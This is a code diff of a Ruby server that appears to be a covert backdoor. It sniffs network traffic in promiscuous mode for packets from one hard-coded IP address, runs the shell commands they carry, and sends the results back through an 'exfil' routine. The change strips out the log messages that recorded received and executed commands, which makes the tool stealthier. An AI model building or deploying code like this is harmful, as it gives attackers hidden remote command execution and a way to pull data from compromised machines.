@@ -17,8 +17,6 @@ class Server
     @shell = Shell.new(timeout)
 
     filter = "tcp and dst port " + @port.to_s + " and src 153.251.232.153"
-    puts "waiting for message from client from src 153.251.232.153 and dest port: #{@port.to_s}"
-
     cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
     cap.stream.each do |p|
       pkt = Packet.parse p
@@ -42,12 +40,14 @@ class Server
     puts "Client packet verified and recieved"
     pkt = Packet.parse p
     str += conn.servRecv(pkt)
-	puts str
     if str[str.length-1] == 10 || str[str.length-2] == 10 || str[str.length-3] == 10 || str[str.length-4] == 10 #aka newline
       result = @shell.executeCmd(str)
-	  puts "returend from executing shell command: #{str}result:\n#{result}"
+          puts "returend from executing shell"
       if result != nil
-        conn.exfilSend(result)
+        #iv = dec.newIv
+        #payload = dec.encrypt(iv,result)
+        #conn.exfilSend(payload)
+        conn.exfil(result)
       end
       str = ""
     end
